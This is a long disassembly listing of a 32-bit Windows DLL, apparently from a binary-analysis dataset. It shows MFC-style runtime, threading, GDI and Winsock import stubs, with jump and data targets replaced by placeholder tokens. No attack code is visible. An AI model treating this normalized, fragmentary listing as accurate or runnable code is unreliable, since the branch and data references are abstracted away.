call [ EnterCriticalSection@IAT ]
push edi
lea ecx [ esi + 0x14 ]
call sub_100183e7
lea eax [ esi + 0x1c ]
push eax
call [ LeaveCriticalSection@IAT ]
jmp r-xdata
mov eax [ ebx ]
mov ecx eax
imul ecx ecx 0x3fffffff
add ecx [ esi + 0xc ]
shl ecx 0x2
push ecx
mov ecx [ edi + 0xc ]
push 0x0
lea eax [ ecx + eax * 4 ]
push eax
call sub_10004940
mov eax [ esi + 0xc ]
add esp 0xc
mov [ ebx ] eax
push edi
push [ esi ]
call [ TlsSetValue@IAT ]
call sub_1001311c
test eax eax
mov [ edi + 0xc ] eax
jne r-xdata
mov eax [ edi + 0xc ]
test eax eax
jne r-xdata
sub_10018780
push esi
mov esi ecx
push edi
lea edi [ esi + 0x1c ]
push edi
call [ EnterCriticalSection@IAT ]
push 0x1
pop ecx
cmp [ esi + 0xc ] ecx
jle r-xdata
push edi
call [ LeaveCriticalSection@IAT ]
pop edi
pop esi
retn 0x4
mov eax [ esi + 0x10 ]
cmp [ eax + ecx * 8 + 0x4 ] 0x0
lea eax [ eax + ecx * 8 ]
jne r-xdata
inc ecx
cmp ecx [ esi + 0xc ]
jl r-xdata
test [ eax ] 0x1
je r-xdata
mov edx [ esp + 0xc ]
mov [ eax + 0x4 ] edx
sub_100187c1
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push 0x1
mov ebx ecx
pop edi
cmp [ esi + 0x8 ] edi
mov [ ebp - 0x4 ] edi
jle r-xdata
lea edi [ ebx + 0x1c ]
push edi
call [ EnterCriticalSection@IAT ]
push esi
lea ecx [ ebx + 0x14 ]
call sub_100183fa
push edi
call [ LeaveCriticalSection@IAT ]
push [ esi + 0xc ]
call [ LocalFree@IAT ]
test esi esi
je r-xdata
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
push 0x0
push [ ebx ]
call [ TlsSetValue@IAT ]
mov eax [ esi ]
push 0x1
mov ecx esi
call [ eax ]
mov eax [ esi + 0xc ]
mov ecx [ eax + edi * 4 ]
test ecx ecx
je r-xdata
mov ecx [ ebx + 0x10 ]
cmp [ ecx + edi * 8 + 0x4 ] eax
je r-xdata
mov eax [ esi + 0xc ]
and [ eax + edi * 4 ] 0x0
mov eax [ ecx ]
push 0x1
call [ eax ]
mov eax [ esi + 0xc ]
cmp [ eax + edi * 4 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
inc edi
cmp edi [ esi + 0x8 ]
jl r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x8
sub_1001885a
push ebx
push esi
mov esi ecx
lea ebx [ esi + 0x1c ]
push ebx
call [ EnterCriticalSection@IAT ]
cmp [ esp + 0x10 ] 0x0
jne r-xdata
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
push [ esi ]
call [ TlsGetValue@IAT ]
test eax eax
je r-xdata
push ebx
call [ LeaveCriticalSection@IAT ]
pop esi
pop ebx
retn 0x8
push edi
push [ esp + 0xc ]
mov ecx esi
push eax
call sub_100187c1
jmp r-xdata
push [ esp + 0x10 ]
mov edi [ eax + 0x4 ]
mov ecx esi
push eax
call sub_100187c1
test edi edi
mov eax edi
jne r-xdata
pop edi
sub_100188b3
push esi
push edi
mov edi ecx
cmp [ edi ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov esi [ edi ]
push [ eax ]
call [ TlsGetValue@IAT ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
test ecx ecx
jne r-xdata
xor esi esi
cmp esi [ eax + 0x8 ]
jge r-xdata
call sub_1001850b
mov [ edi ] eax
mov ecx rw-data
mov eax ecx
test eax eax
je r-xdata
mov eax esi
pop edi
pop esi
retn 0x4
call [ esp + 0xc ]
mov ecx [ rw-data ]
mov esi eax
push esi
push [ edi ]
call sub_1001867a
mov eax [ eax + 0xc ]
mov esi [ eax + esi * 4 ]
jmp r-xdata
xor ecx ecx
call sub_10018472
mov ecx eax
jmp r-xdata
test esi esi
jne r-xdata
mov [ rw-data ] ecx
sub_1001892a
push esi
mov esi [ ecx ]
test esi esi
je r-xdata
xor eax eax
pop esi
retn
mov eax [ rw-data ]
test eax eax
je r-xdata
push [ eax ]
call [ TlsGetValue@IAT ]
test eax eax
je r-xdata
cmp esi [ eax + 0x8 ]
jge r-xdata
mov eax [ eax + 0xc ]
mov eax [ eax + esi * 4 ]
pop esi
retn
sub_10018957
push esi
mov esi ecx
mov eax [ esi ]
test eax eax
je r-xdata
and [ esi ] 0x0
pop esi
retn
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
push eax
call sub_1001861d
sub_10018975
mov eax sub_100199b8
call sub_10004904
push ecx
push ecx
push ebx
push esi
push edi
mov esi ecx
xor edi edi
mov [ ebp - 0x10 ] esp
cmp [ esi ] edi
jne r-xdata
mov eax [ esi ]
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x4
push 0x10
call sub_1001901a
mov [ ebp - 0x4 ] edi
cmp [ esi ] edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
push 0x10
call sub_1001908a
call [ ebp + 0x8 ]
mov [ esi ] eax
sub_100189d0
push ebp
mov ebp esp
push ecx
cmp [ ecx ] 0x0
je r-xdata
leave
retn
mov eax [ ecx ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ecx ]
push 0x1
call [ eax ]
sub_10018a86
mov eax sub_10019a18
call sub_10004904
push ecx
push esi
mov esi ecx
push edi
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov ecx [ esi + 0xcc ]
and [ ebp - 0x4 ] 0x0
lea edi [ esi + 0xcc ]
test ecx ecx
je r-xdata
mov eax [ esi + 0x30 ]
mov edi [ UnhookWindowsHookEx@IAT ]
test eax eax
je r-xdata
mov eax [ ecx ]
call [ eax + 0x58 ]
mov ecx [ edi ]
test ecx ecx
je r-xdata
mov eax [ esi + 0x2c ]
test eax eax
je r-xdata
push eax
call edi
mov eax [ ecx ]
push 0x1
call [ eax + 0x4 ]
mov esi [ esi + 0xc ]
test esi esi
je r-xdata
push eax
call edi
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
push esi
call sub_1000413e
pop ecx
sub_10018b30
mov eax ecx
xor edx edx
lea ecx [ eax + 0x103c ]
mov [ eax + 0x1c ] edx
mov [ eax + 0x20 ] edx
mov [ eax + 0x24 ] edx
mov [ eax + 0x28 ] edx
mov [ ecx ] edx
mov [ ecx + 0x4 ] edx
or [ eax + 0x104c ] 0xffffffff
lea ecx [ eax + 0x1048 ]
mov [ ecx + 0x8 ] edx
mov [ ecx + 0x1c ] edx
mov [ ecx + 0x20 ] edx
mov cl [ esp + 0x4 ]
mov [ eax ] r--data
mov [ eax + 0x28 ] 0x1c
mov [ eax + 0x20 ] 0x14
mov [ eax + 0x18 ] edx
mov [ eax + 0x14 ] cl
mov [ eax + 0x30 ] 0x1
mov [ eax + 0x1040 ] 0x18
retn 0x4
sub_10018bae
mov eax sub_10019a3a
call sub_10004904
push ecx
push esi
mov esi ecx
push edi
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov ecx [ esi + 0x1044 ]
mov [ ebp - 0x4 ] 0x1
test ecx ecx
je r-xdata
mov ecx [ esi + 0x106c ]
lea edi [ esi + 0x106c ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
and [ ebp - 0x4 ] 0x0
lea ecx [ esi + 0x1070 ]
call sub_10018957
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
mov eax [ ecx ]
lea edx [ esi + 0x1048 ]
push edx
call [ eax + 0xc ]
mov ecx [ edi ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax + 0x4 ]
sub_10018c5d
mov eax sub_10019a4c
call sub_10004904
push ecx
push ebx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov ecx [ esi + 0x14 ]
and [ ebp - 0x4 ] 0x0
push 0x1
test ecx ecx
pop ebx
je r-xdata
mov ecx [ esi + 0x18 ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push ebx
call [ eax ]
mov ecx [ esi + 0x1c ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push ebx
call [ eax ]
mov ecx [ esi + 0x20 ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push ebx
call [ eax ]
mov ecx [ esi + 0x24 ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push ebx
call [ eax ]
mov ecx [ esi + 0x38 ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push ebx
call [ eax ]
mov ecx [ esi + 0x30 ]
test ecx ecx
je r-xdata
cmp [ ecx + 0xc ] 0x0
je r-xdata
mov ecx [ esi + 0x34 ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push ebx
call [ eax + 0x4 ]
call sub_10013252
push eax
call sub_10014657
pop ecx
mov ecx [ esi + 0x38 ]
jmp r-xdata
mov ecx [ esi + 0x38 ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push ebx
call [ eax + 0x4 ]
mov ecx [ ebp - 0xc ]
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn
mov eax [ ecx ]
push ebx
call [ eax + 0x4 ]
sub_10018d69
push esi
push 0x1074
call sub_10018440
mov esi eax
test esi esi
je r-xdata
xor eax eax
pop esi
retn
push 0x1
mov ecx esi
call sub_10018b30
mov [ esi ] r--data
mov eax esi
pop esi
retn
sub_10018db1
push esi
mov esi [ SetErrorMode@IAT ]
push 0x0
call esi
or ax 0x8001
push eax
call esi
call sub_10018d2c
mov esi [ esp + 0x8 ]
mov [ eax + 0x8 ] esi
mov [ eax + 0xc ] esi
call sub_10018d2c
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
call sub_10018d2c
cmp [ eax + 0x14 ] 0x0
pop esi
jne r-xdata
mov ecx [ esp + 0xc ]
mov [ eax + 0x68 ] esi
mov [ eax + 0x6c ] ecx
mov ecx [ esp + 0x10 ]
mov [ eax + 0x70 ] ecx
mov ecx [ esp + 0x14 ]
mov [ eax + 0x74 ] ecx
mov ecx eax
call sub_10018e14
push 0x1
pop eax
retn 0x10
call sub_10013b96
sub_10018e14
push ebp
mov ebp esp
sub esp 0x30c
push ebx
push esi
push edi
mov esi ecx
call sub_10018d2c
mov edi eax
mov eax [ esi + 0x68 ]
mov ebx 0x104
mov [ edi + 0x8 ] eax
mov eax [ esi + 0x68 ]
mov [ edi + 0xc ] eax
lea eax [ ebp - 0x20c ]
push ebx
push eax
push [ esi + 0x68 ]
call [ GetModuleFileNameA@IAT ]
lea eax [ ebp - 0x20c ]
push 0x2e
push eax
call sub_10004b65
and [ eax ] 0x0
pop ecx
pop ecx
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x108 ]
push ebx
push eax
lea eax [ ebp - 0x20c ]
push eax
call sub_10018f31
xor ebx ebx
cmp [ esi + 0x88 ] ebx
jne r-xdata
cmp [ esi + 0x78 ] ebx
jne r-xdata
lea eax [ ebp - 0x108 ]
push eax
call sub_10004b3a
pop ecx
mov [ esi + 0x88 ] eax
mov eax [ esi + 0x78 ]
mov [ edi + 0x10 ] eax
cmp [ esi + 0x8c ] ebx
lea edi [ esi + 0x8c ]
jne r-xdata
lea eax [ ebp - 0x30c ]
push 0x100
push eax
push 0xe000
call sub_1001768d
test eax eax
je r-xdata
cmp [ esi + 0x90 ] 0x0
jne r-xdata
mov ebx [ ebp - 0x4 ]
push r--data
push ebx
call [ lstrcpyA@IAT ]
lea eax [ ebp - 0x20c ]
push eax
call sub_10004b3a
mov [ edi ] eax
and [ ebx ] 0x0
pop ecx
push [ esi + 0x88 ]
lea eax [ ebp - 0x30c ]
push eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
lea eax [ ebp - 0x108 ]
push r--data
push eax
call [ lstrcatA@IAT ]
lea eax [ ebp - 0x108 ]
push eax
call sub_10004b3a
pop ecx
mov [ esi + 0x90 ] eax
call sub_10004b3a
pop ecx
mov [ esi + 0x78 ] eax
sub_10018f31
push esi
mov esi [ esp + 0x8 ]
push edi
mov edi esi
cmp [ esp + 0x10 ] 0x0
jne r-xdata
mov al [ esi ]
cmp al 0x5c
je r-xdata
push [ esp + 0x14 ]
push edi
push [ esp + 0x18 ]
call [ lstrcpynA@IAT ]
xor eax eax
push edi
call [ lstrlenA@IAT ]
inc eax
jmp r-xdata
push esi
call sub_10004923
pop ecx
mov edi eax
cmp al 0x2f
je r-xdata
pop edi
pop esi
retn 0xc
cmp [ esi ] 0x0
je r-xdata
cmp al 0x3a
jne r-xdata
push esi
call sub_10004923
pop ecx
mov esi eax
jmp r-xdata
sub_10018f87
cmp [ rw-data ] 0x0
push esi
jne r-xdata
mov eax [ rw-data ]
pop esi
retn
push 0x1
pop esi
mov [ rw-data ] esi
call [ GetVersion@IAT ]
cmp al 0x4
jae r-xdata
and [ rw-data ] 0x0
push rw-data
call [ InitializeCriticalSection@IAT ]
test eax 0x80000000
je r-xdata
mov [ rw-data ] esi
jmp r-xdata
sub_10018fcc
cmp [ rw-data ] 0x0
je r-xdata
retn
dec [ rw-data ]
cmp [ rw-data ] 0x0
jne r-xdata
push ebx
push esi
push edi
mov edi [ DeleteCriticalSection@IAT ]
push rw-data
call edi
mov esi rw-data
mov ebx rw-data
add ebx 0x18
add esi 0x4
cmp ebx rw-data
jl r-xdata
push ebx
call edi
dec [ esi ]
cmp [ esi ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
sub_1001901a
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
jne r-xdata
cmp [ rw-data ] ebx
jne r-xdata
call sub_10018f87
pop ebx
retn 0x4
push esi
push edi
mov edi [ esp + 0x10 ]
cmp [ edi * 4 + rw-data ] ebx
mov ebx [ EnterCriticalSection@IAT ]
lea esi [ edi * 4 + rw-data ]
jne r-xdata
lea eax [ edi + edi * 2 ]
lea eax [ eax * 8 + rw-data ]
push eax
call ebx
pop edi
pop esi
push ebp
mov ebp rw-data
push ebp
call ebx
cmp [ esi ] 0x0
jne r-xdata
push ebp
call [ LeaveCriticalSection@IAT ]
pop ebp
lea eax [ edi + edi * 2 ]
lea eax [ eax * 8 + rw-data ]
push eax
call [ InitializeCriticalSection@IAT ]
inc [ esi ]
sub_10019121
push ebp
mov ebp esp
sub esp 0x90
push ebx
push esi
push edi
call [ GetMenuCheckMarkDimensions@IAT ]
movsx ebx ax
shr eax 0x10
movsx ecx ax
cmp ebx 0x20
mov [ ebp - 0xc ] ecx
jle r-xdata
lea eax [ ebx - 0x4 ]
lea esi [ ebx + 0xf ]
cdq
sub eax edx
sar esi 0x4
mov edi eax
mov eax esi
sar edi 0x1
shl eax 0x4
add edi eax
sub edi ebx
cmp edi 0xc
jle r-xdata
push 0x20
pop ebx
push 0x20
pop eax
cmp ecx eax
jle r-xdata
push 0xc
pop edi
push 0x80
lea eax [ ebp - 0x90 ]
push 0xff
push eax
call sub_10004940
mov eax [ ebp - 0xc ]
add esp 0xc
add eax 0xfffffffa
mov [ ebp - 0x4 ] r--data
sar eax 0x1
imul eax esi
add esi esi
mov [ ebp - 0x8 ] 0x5
lea edx [ ebp + eax * 2 - 0x90 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov ecx edi
movzx ax [ eax ]
shl eax cl
inc [ ebp - 0x4 ]
xor ecx ecx
not eax
mov cl ah
mov [ edx + 0x1 ] al
mov [ edx ] cl
add edx esi
dec [ ebp - 0x8 ]
jne r-xdata
lea eax [ ebp - 0x90 ]
push eax
push 0x1
push 0x1
push [ ebp - 0xc ]
push ebx
call [ CreateBitmap@IAT ]
pop edi
pop esi
test eax eax
mov [ rw-data ] eax
pop ebx
jne r-xdata
leave
retn
push 0x7fe3
push eax
call [ LoadBitmapA@IAT ]
mov [ rw-data ] eax
sub_10019201
mov eax sub_10019bb5
call sub_10004904
push ecx
push 0x3c
call sub_1001462e
pop ecx
mov ecx eax
mov [ ebp - 0x10 ] ecx
xor eax eax
cmp ecx eax
mov [ ebp - 0x4 ] eax
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
call sub_10015016
sub_10019239
mov eax sub_10019bca
call sub_10004904
push ecx
push esi
mov ecx rw-data
call sub_10003c35
mov esi eax
mov [ ebp - 0x10 ] esi
xor eax eax
cmp esi eax
mov [ ebp - 0x4 ] eax
je r-xdata
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
mov ecx esi
call sub_10015016
mov [ esi ] r--data
mov eax esi
sub_100192e4
mov eax sub_10019bdd
call sub_10004904
push ecx
push 0x10
call sub_10018440
mov ecx eax
mov [ ebp - 0x10 ] ecx
xor eax eax
cmp ecx eax
mov [ ebp - 0x4 ] eax
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
call sub_100194eb
sub_10019315
mov eax sub_10019bf0
call sub_10004904
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov eax [ esi + 0x10 ]
and [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
push 0x0
call eax
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
push esi
call [ FreeLibrary@IAT ]
sub_10019356
mov eax sub_10019c04
call sub_10004904
push ecx
mov [ ebp - 0x10 ] ecx
mov [ ecx ] r--data
mov eax [ rw-data ]
and [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
mov eax [ eax + 0x18 ]
test eax eax
je r-xdata
call eax
sub_100193f8
cmp [ rw-data ] 0x0
je r-xdata
retn
push esi
mov esi [ GetSystemMetrics@IAT ]
push 0x2
call esi
inc eax
push 0x3
mov [ rw-data ] eax
call esi
inc eax
mov [ rw-data ] 0x1
mov [ rw-data ] eax
pop esi
sub_1001944a
push ebx
push esi
push edi
mov esi ecx
call [ GetVersion@IAT ]
xor ecx ecx
push 0x1
mov cl ah
movzx edx al
movzx ecx cl
shl edx 0x8
add ecx edx
mov [ esi + 0x54 ] ecx
mov ecx eax
shr ecx 0x1f
cmp al 0x4
mov [ esi + 0x58 ] ecx
sbb eax eax
pop ecx
inc eax
xor ebx ebx
sub ecx eax
cmp eax ebx
mov [ esi + 0x5c ] eax
mov [ esi + 0x60 ] ecx
mov [ esi + 0x64 ] eax
mov [ esi + 0x68 ] ebx
je r-xdata
mov ecx esi
call sub_100175b1
mov ecx esi
mov [ esi + 0x24 ] ebx
call sub_1001756d
mov edi [ LoadCursorA@IAT ]
push 0x7f02
push ebx
call edi
push 0x7f00
push ebx
mov [ esi + 0x3c ] eax
call edi
mov [ esi + 0x40 ] eax
xor eax eax
cmp [ esi + 0x5c ] ebx
mov [ esi + 0x50 ] ebx
mov [ esi + 0x44 ] ebx
pop edi
setne al
inc eax
mov [ esi + 0x10 ] eax
mov [ esi + 0x14 ] eax
mov eax esi
pop esi
pop ebx
retn
push ebx
call [ GetProcessVersion@IAT ]
cmp eax 0x40000
sbb eax eax
inc eax
mov [ esi + 0x68 ] eax
sub_10019535
push ebp
mov ebp esp
sub esp 0x14
lea eax [ ebp - 0x14 ]
push eax
call [ GetOEMCP@IAT ]
push eax
call [ GetCPInfo@IAT ]
push 0x1
pop eax
cmp eax [ ebp - 0x14 ]
sbb eax eax
neg eax
leave
retn
sub_100196e0
push esi
mov ecx rw-data
call sub_10003c35
mov esi eax
test esi esi
je r-xdata
xor eax eax
pop esi
retn
mov ecx esi
call sub_100179fe
mov [ esi ] r--data
mov eax esi
pop esi
retn
sub_1001981c
push ebx
push ebp
push esi
push edi
call sub_10018d2c
push 0x1
mov ebp eax
call sub_1001901a
add ebp 0x34
xor ebx ebx
mov esi ebp
push 0x1
mov [ ebp ] bl
call sub_1001908a
call sub_10018d2c
mov eax [ eax + 0x4 ]
cmp eax ebx
je r-xdata
push 0xa
push esi
call sub_10004aa3
pop ecx
mov edi eax
pop ecx
mov [ edi ] bl
call sub_10018d2c
push [ eax + 0x8 ]
push esi
call [ UnregisterClassA@IAT ]
lea esi [ edi + 0x1 ]
jmp r-xdata
call sub_10018afa
mov esi eax
mov ecx [ esi + 0xcc ]
lea edi [ esi + 0xcc ]
cmp ecx ebx
je r-xdata
mov eax [ eax + 0x54 ]
cmp eax ebx
je r-xdata
cmp [ esi ] bl
je r-xdata
call sub_10018d2c
cmp [ eax + 0x14 ] bl
jne r-xdata
mov eax [ ecx ]
call [ eax + 0xb8 ]
test eax eax
je r-xdata
push ebx
push 0x1
call eax
pop edi
pop esi
pop ebp
pop ebx
retn
mov eax [ esi + 0x30 ]
mov edi [ UnhookWindowsHookEx@IAT ]
cmp eax ebx
je r-xdata
mov [ edi ] ebx
mov eax [ esi + 0x2c ]
cmp eax ebx
je r-xdata
push eax
call edi
mov [ esi + 0x30 ] ebx
push eax
call edi
mov [ esi + 0x2c ] ebx
sub_100198db
mov eax sub_10019c4c
call sub_10004904
push ecx
mov [ ebp - 0x10 ] ecx
mov [ ecx ] r--data
and [ ebp - 0x4 ] 0x0
add ecx 0x4
push ecx
call sub_1001795d
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
WSACleanup
jmp [ WSACleanup@IAT ]
gethostname
jmp [ gethostname@IAT ]
gethostbyname
jmp [ gethostbyname@IAT ]
WSAStartup
jmp [ WSAStartup@IAT ]
sub_100037c1
push 0x1
push 0x0
call sub_10018a0b
call sub_10018fcc
jmp sub_10018a2c
j_sub_100037d9
jmp sub_100037d9
sub_100037d9
call sub_10018a25
push sub_100037c1
call sub_1000487d
pop ecx
mov [ rw-data ] al
retn
sub_100037ef
retn 0x4
sub_100037f2
push esi
mov esi ecx
call sub_1000380e
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_10014657
pop ecx
sub_1000380e
mov eax sub_10019984
call sub_10004904
push ecx
mov [ ebp - 0x10 ] ecx
mov [ ecx ] r--data
and [ ebp - 0x4 ] 0x0
add ecx 0x10
call sub_100144cd
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
sub_1000383a
push [ esp + 0x4 ]
add ecx 0xc
call sub_10014576
retn 0x4
sub_10003849
push [ esp + 0x4 ]
call sub_10014657
pop ecx
retn 0x4
sub_10003856
call sub_10013b81
test eax eax
je r-xdata
xor eax eax
retn
mov edx [ eax ]
mov ecx eax
call [ edx + 0x74 ]
retn
sub_1000386a
push esi
mov esi ecx
call sub_10003886
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_10014657
pop ecx
sub_100038ce
retn
sub_100038cf
push esi
mov esi ecx
push [ esp + 0x8 ]
call sub_1001466c
mov eax [ esp + 0xc ]
and [ esi + 0xc ] 0x0
and [ esi + 0x10 ] 0x0
mov [ esi + 0x94 ] eax
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x8
sub_100038f9
push esi
mov esi ecx
call sub_10003915
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_10014657
pop ecx
sub_10003915
mov [ ecx ] r--data
retn
sub_1000391c
push esi
mov esi ecx
push [ esp + 0x8 ]
call sub_1001466c
mov eax [ esp + 0xc ]
and [ esi + 0xc ] 0x0
and [ esi + 0x10 ] 0x0
mov [ esi + 0x94 ] eax
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x8
sub_10003946
push esi
mov esi ecx
call sub_10003962
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_10014657
pop ecx
sub_10003962
mov [ ecx ] r--data
retn
sub_10003b95
mov eax [ ecx + 0x20 ]
test eax eax
jne r-xdata
push eax
call sub_100153b4
retn
push [ ecx + 0x1c ]
call [ GetParent@IAT ]
sub_10003bac
push 0x0
push [ ecx + 0x1c ]
call [ EnableWindow@IAT ]
retn
sub_10003bb8
push 0x1
push [ ecx + 0x1c ]
call [ EnableWindow@IAT ]
retn
sub_10003bc4
call sub_10018d2c
mov ecx [ eax + 0x4 ]
jmp sub_10014d07
sub_10003bf9
push esi
mov esi ecx
call sub_10003c0d
add esi 0x10
push esi
call [ DeleteCriticalSection@IAT ]
pop esi
retn
sub_10003cf0
push esi
mov esi ecx
call sub_10003d0c
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_10014657
pop ecx
sub_10003d0c
mov eax sub_10019c88
call sub_10004904
push ecx
mov [ ebp - 0x10 ] ecx
mov [ ecx ] r--data
and [ ebp - 0x4 ] 0x0
call sub_10017830
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
sub_10003d35
push esi
mov esi ecx
push [ esp + 0x8 ]
call sub_1001466c
mov eax [ esp + 0xc ]
and [ esi + 0xc ] 0x0
and [ esi + 0x10 ] 0x0
mov [ esi + 0x94 ] eax
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x8
sub_10003d5f
push esi
mov esi ecx
call sub_10003d7b
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_10014657
pop ecx
sub_10003d7b
mov [ ecx ] r--data
retn
sub_10003d82
push esi
mov esi ecx
push [ esp + 0x8 ]
call sub_1001466c
mov eax [ esp + 0xc ]
and [ esi + 0xc ] 0x0
and [ esi + 0x10 ] 0x0
mov [ esi + 0x94 ] eax
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x8
sub_10003dac
push esi
mov esi ecx
call sub_10003dc8
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_10014657
pop ecx
sub_10003dc8
mov [ ecx ] r--data
retn
sub_10003dcf
push esi
mov esi ecx
call sub_10003deb
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_10014657
pop ecx
sub_10003deb
mov eax sub_10019cec
call sub_10004904
push ecx
mov [ ebp - 0x10 ] ecx
mov [ ecx ] r--data
and [ ebp - 0x4 ] 0x0
call sub_10017f58
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
sub_10003e14
push [ esp + 0x8 ]
push [ esp + 0x8 ]
push [ ecx + 0x4 ]
call [ PtVisible@IAT ]
retn 0x8
sub_10003e28
push [ esp + 0x4 ]
push [ ecx + 0x4 ]
call [ RectVisible@IAT ]
retn 0x4
sub_10003e38
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ ecx + 0x4 ]
call [ TextOutA@IAT ]
retn 0x10
sub_10003eb1
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ ecx + 0x4 ]
call [ DrawTextA@IAT ]
retn 0x10
sub_10003efd
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ ecx + 0x4 ]
call [ Escape@IAT ]
retn 0x10
sub_100042b4
pop eax
pop ecx
xchg [ esp ] eax
jmp eax
sub_100042bb
pop eax
pop ecx
xchg [ esp ] eax
jmp eax
sub_100044e3
push 0x1
pop eax
pop edi
pop esi
pop ebx
pop ebp
retn
sub_10004588
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_10004612
xor eax eax
mov ecx [ fs : 0x0 ]
cmp [ ecx + 0x4 ] sub_10004588
jne r-xdata
retn
mov edx [ ecx + 0xc ]
mov edx [ edx + 0xc ]
cmp [ ecx + 0x8 ] edx
jne r-xdata
mov eax 0x1
sub_1000463e
push ebx
push ecx
mov ebx rw-data
mov ecx [ ebp + 0x8 ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
pop ecx
pop ebx
retn 0x4
sub_1000487d
push [ esp + 0x4 ]
call sub_100047ff
neg eax
sbb eax eax
pop ecx
neg eax
dec eax
retn
sub_100048e7
push esi
mov esi ecx
call sub_100048be
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_10014657
pop ecx
sub_10004904
push 0xffffffff
push eax
mov eax [ fs : 0x0 ]
push eax
mov eax [ esp + 0xc ]
mov [ fs : 0x0 ] esp
mov [ esp + 0xc ] ebp
lea ebp [ esp + 0xc ]
push eax
retn
sub_10005159
push 0x1
push [ esp + 0x8 ]
call sub_10005167
pop ecx
pop ecx
retn
sub_1000598d
cmp [ rw-data ] 0x0
jne r-xdata
retn
push 0xfffffffd
call sub_100055b5
pop ecx
mov [ rw-data ] 0x1
sub_100059a9
mov eax [ rw-data ]
test eax eax
je r-xdata
push rw-data
push rw-data
call sub_10005abe
push rw-data
push rw-data
call sub_10005abe
add esp 0x10
retn
call eax
sub_100059d6
push 0x0
push 0x0
push [ esp + 0xc ]
call sub_10005a07
add esp 0xc
retn
sub_100059e7
push 0x0
push 0x1
push [ esp + 0xc ]
call sub_10005a07
add esp 0xc
retn
sub_100059f8
push 0x1
push 0x0
push 0x0
